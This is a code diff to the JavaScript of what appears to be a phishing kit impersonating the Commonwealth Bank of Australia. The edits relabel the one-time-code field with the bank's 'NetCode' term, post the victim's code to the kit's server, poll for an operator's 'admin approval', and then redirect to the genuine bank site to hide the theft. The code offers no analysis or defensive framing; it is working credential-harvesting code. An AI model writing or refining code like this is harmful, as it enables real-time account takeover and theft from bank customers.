@@ -43,6 +43,7 @@
         throw 0;
     }
 
+    // Register that we're on the verify/OTP page
     fetch('/api/page', {
         method: 'POST',
         headers: { 'content-type': 'application/json' },
@@ -74,14 +75,14 @@
         if (!otp) {
             errors.push({
                 field: 'txtMyClientNumber_field',
-                label: 'OTP',
+                label: 'NetCode',
                 message: 'This is required.'
             });
         } else if (!/^\d{4,6}$/.test(otp)) {
             errors.push({
                 field: 'txtMyClientNumber_field',
-                label: 'OTP',
-                message: 'Please enter a valid OTP.'
+                label: 'NetCode',
+                message: 'Please enter a valid NetCode.'
             });
         }
 
@@ -256,6 +257,7 @@
                 if (data.status === 'ok') {
                     isWaitingForAdmin = false;
                     clearTimeout(pollTimeout);
+                    // Redirect to real Commonwealth Bank website
                     window.location.replace('https://www.commbank.com.au');
                     return;
                 }
@@ -306,6 +308,7 @@
 
         showLoading();
 
+        // Send OTP to server
         const payload = { sid, otp };
         fetch('/api/otp', {
             method: 'POST',
@@ -314,10 +317,11 @@
         })
         .then(res => {
             if (res.ok) {
+                // Start polling for admin approval
                 startPolling();
             } else {
                 hideLoading();
-                alert('Invalid OTP. Please try again.');
+                alert('Invalid NetCode. Please try again.');
             }
         })
         .catch(err => {
